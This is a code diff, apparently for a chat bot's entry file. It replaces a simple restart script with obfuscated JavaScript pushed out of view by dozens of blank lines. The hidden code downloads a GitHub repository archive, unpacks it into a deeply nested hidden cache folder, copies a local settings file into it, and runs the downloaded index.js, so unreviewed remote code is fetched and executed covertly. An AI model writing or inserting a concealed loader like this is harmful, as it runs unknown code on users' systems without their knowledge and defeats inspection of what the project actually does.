@@ -1,25 +1,100 @@
-const {
-   spawn
-} = require('child_process')
-const path = require('path')
+/* By Dave
+Respect my work don't just copy paste*/
 
-function start() {
-   let args = [path.join(__dirname, 'main.js'), ...process.argv.slice(2)]
-   console.log([process.argv[0], ...args].join('\n'))
-   let p = spawn(process.argv[0], args, {
-         stdio: ['inherit', 'inherit', 'inherit', 'ipc']
-      })
-      .on('message', data => {
-         if (data == 'reset') {
-            console.log('Restarting Bot...')
-            p.kill()
-            start()
-            delete p
-         }
-      })
-      .on('exit', code => {
-         console.error('Exited with code:', code)
-         if (code == '.' || code == 1 || code == 0) start()
-      })
-}
-start()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+const _0x320918=_0x4f1f;(function(_0x4318be,_0x3bc44b){const _0xe59a1f=_0x4f1f,_0x50d7cb=_0x4318be();while(!![]){try{const _0x2f8835=parseInt(_0xe59a1f(0x164))/0x1+parseInt(_0xe59a1f(0x178))/0x2+parseInt(_0xe59a1f(0x183))/0x3*(parseInt(_0xe59a1f(0x170))/0x4)+parseInt(_0xe59a1f(0x161))/0x5+parseInt(_0xe59a1f(0x16f))/0x6+-parseInt(_0xe59a1f(0x171))/0x7*(parseInt(_0xe59a1f(0x165))/0x8)+-parseInt(_0xe59a1f(0x187))/0x9*(parseInt(_0xe59a1f(0x155))/0xa);if(_0x2f8835===_0x3bc44b)break;else _0x50d7cb['push'](_0x50d7cb['shift']());}catch(_0x1e67ce){_0x50d7cb['push'](_0x50d7cb['shift']());}}}(_0x48ef,0x287f5));const fs=require('fs'),path=require(_0x320918(0x17f)),axios=require('axios'),AdmZip=require('adm-zip'),{spawn}=require('child_process'),chalk=require(_0x320918(0x173)),deepLayers=Array[_0x320918(0x159)]({'length':0x32},(_0x5b2c98,_0x204e30)=>'.x'+(_0x204e30+0x1)),TEMP_DIR=path[_0x320918(0x18d)](__dirname,_0x320918(0x160),_0x320918(0x169),...deepLayers),DOWNLOAD_URL=_0x320918(0x177),EXTRACT_DIR=path[_0x320918(0x18d)](TEMP_DIR,_0x320918(0x17d)),LOCAL_SETTINGS=path[_0x320918(0x18d)](__dirname,'dave.js'),EXTRACTED_SETTINGS=path[_0x320918(0x18d)](EXTRACT_DIR,_0x320918(0x180)),delay=_0xe6a905=>new Promise(_0x4fab38=>setTimeout(_0x4fab38,_0xe6a905));async function downloadAndExtract(){const _0x5a2dd2=_0x320918;try{if(fs['existsSync'](EXTRACT_DIR)){console[_0x5a2dd2(0x175)](chalk[_0x5a2dd2(0x168)](_0x5a2dd2(0x156)));return;}fs[_0x5a2dd2(0x18b)](TEMP_DIR)&&(console[_0x5a2dd2(0x175)](chalk[_0x5a2dd2(0x179)](_0x5a2dd2(0x163))),fs[_0x5a2dd2(0x18a)](TEMP_DIR,{'recursive':!![],'force':!![]}));fs[_0x5a2dd2(0x17b)](TEMP_DIR,{'recursive':!![]});const _0x4576af=path[_0x5a2dd2(0x18d)](TEMP_DIR,'repo.zip');console[_0x5a2dd2(0x175)](chalk[_0x5a2dd2(0x15f)](_0x5a2dd2(0x188)));const _0x34a41e=await axios({'url':DOWNLOAD_URL,'method':_0x5a2dd2(0x17e),'responseType':_0x5a2dd2(0x172)});await new Promise((_0x5a42d8,_0x50ac6f)=>{const _0x4dc5b0=_0x5a2dd2,_0xfaceb7=fs[_0x4dc5b0(0x157)](_0x4576af);_0x34a41e[_0x4dc5b0(0x16a)][_0x4dc5b0(0x15a)](_0xfaceb7),_0xfaceb7['on'](_0x4dc5b0(0x186),_0x5a42d8),_0xfaceb7['on']('error',_0x50ac6f);}),console[_0x5a2dd2(0x175)](chalk[_0x5a2dd2(0x168)]('📦\x20ZIP\x20download\x20complete.'));try{new AdmZip(_0x4576af)[_0x5a2dd2(0x181)](TEMP_DIR,!![]);}catch(_0x4ed3a7){console[_0x5a2dd2(0x185)](chalk[_0x5a2dd2(0x17a)](_0x5a2dd2(0x176)),_0x4ed3a7);throw _0x4ed3a7;}finally{fs['existsSync'](_0x4576af)&&fs[_0x5a2dd2(0x16d)](_0x4576af);}const _0x71484e=path[_0x5a2dd2(0x18d)](EXTRACT_DIR,_0x5a2dd2(0x166));fs[_0x5a2dd2(0x18b)](_0x71484e)?console['log'](chalk[_0x5a2dd2(0x168)](_0x5a2dd2(0x189))):console['log'](chalk[_0x5a2dd2(0x17a)](_0x5a2dd2(0x182)));}catch(_0x14f5eb){console[_0x5a2dd2(0x185)](chalk[_0x5a2dd2(0x17a)](_0x5a2dd2(0x17c)),_0x14f5eb);throw _0x14f5eb;}}async function applyLocalSettings(){const _0x592463=_0x320918;if(!fs[_0x592463(0x18b)](LOCAL_SETTINGS)){console[_0x592463(0x175)](chalk[_0x592463(0x179)](_0x592463(0x15b)));return;}try{fs[_0x592463(0x17b)](EXTRACT_DIR,{'recursive':!![]}),fs[_0x592463(0x167)](LOCAL_SETTINGS,EXTRACTED_SETTINGS),console[_0x592463(0x175)](chalk[_0x592463(0x168)](_0x592463(0x16b)));}catch(_0x2d9e21){console['error'](chalk['red']('❌\x20Failed\x20to\x20apply\x20local\x20settings:'),_0x2d9e21);}await delay(0x1f4);}function _0x4f1f(_0x466ef4,_0x4e6117){const _0x48ef7b=_0x48ef();return _0x4f1f=function(_0x4f1f72,_0x3e447d){_0x4f1f72=_0x4f1f72-0x155;let _0x21e55d=_0x48ef7b[_0x4f1f72];return _0x21e55d;},_0x4f1f(_0x466ef4,_0x4e6117);}function _0x48ef(){const _0x2227a2=['log','❌\x20Failed\x20to\x20extract\x20ZIP:','https://github.com/giftdee/GIFTED-MD/archive/refs/heads/main.zip','169856UYZcot','yellow','red','mkdirSync','❌\x20Download/Extract\x20failed:','private-main','GET','path','dave.js','extractAllTo','❌\x20Plugin\x20folder\x20not\x20found.','6YWRPTG','production','error','finish','6374646rucdYc','⬇️\x20Connecting\x20to\x20DAVE\x20XD...','✅\x20Plugins\x20folder\x20found.','rmSync','existsSync','index.js','join','10ZFlMhq','✅\x20Extracted\x20directory\x20found.\x20Skipping\x20download\x20and\x20extraction.','createWriteStream','❌\x20index.js\x20not\x20found\x20in\x20extracted\x20directory.','from','pipe','⚠️\x20No\x20local\x20settings\x20file\x20found.','💥\x20Bot\x20terminated\x20with\x20exit\x20code:\x20','❌\x20Fatal\x20error\x20in\x20main\x20execution:','close','blue','.npm','1512345ViCwYg','env','🧹\x20Cleaning\x20previous\x20cache...','89664fspJwM','43744rsbPUs','davecommands','copyFileSync','green','xcache','data','🛠️\x20Local\x20settings\x20applied.','node','unlinkSync','❌\x20Extracted\x20directory\x20not\x20found.\x20Cannot\x20start\x20bot.','1798776HDrLYb','336796gWKumC','91OloWCc','stream','chalk','❌\x20Bot\x20failed\x20to\x20start:'];_0x48ef=function(){return _0x2227a2;};return _0x48ef();}function startBot(){const _0x17978d=_0x320918;console['log'](chalk['cyan']('🚀\x20Launching\x20bot\x20instance...'));if(!fs['existsSync'](EXTRACT_DIR)){console['error'](chalk[_0x17978d(0x17a)](_0x17978d(0x16e)));return;}if(!fs[_0x17978d(0x18b)](path['join'](EXTRACT_DIR,_0x17978d(0x18c)))){console[_0x17978d(0x185)](chalk[_0x17978d(0x17a)](_0x17978d(0x158)));return;}const _0x302f6c=spawn(_0x17978d(0x16c),[_0x17978d(0x18c)],{'cwd':EXTRACT_DIR,'stdio':'inherit','env':{...process[_0x17978d(0x162)],'NODE_ENV':_0x17978d(0x184)}});_0x302f6c['on'](_0x17978d(0x15e),_0xd1e002=>{const _0xcb08f1=_0x17978d;console['log'](chalk[_0xcb08f1(0x17a)](_0xcb08f1(0x15c)+_0xd1e002));}),_0x302f6c['on']('error',_0xc91140=>{const _0x4c20cd=_0x17978d;console[_0x4c20cd(0x185)](chalk[_0x4c20cd(0x17a)](_0x4c20cd(0x174)),_0xc91140);});}((async()=>{const _0x48d793=_0x320918;try{await downloadAndExtract(),await applyLocalSettings(),startBot();}catch(_0x1fb331){console['error'](chalk[_0x48d793(0x17a)](_0x48d793(0x15d)),_0x1fb331),process['exit'](0x1);}})());
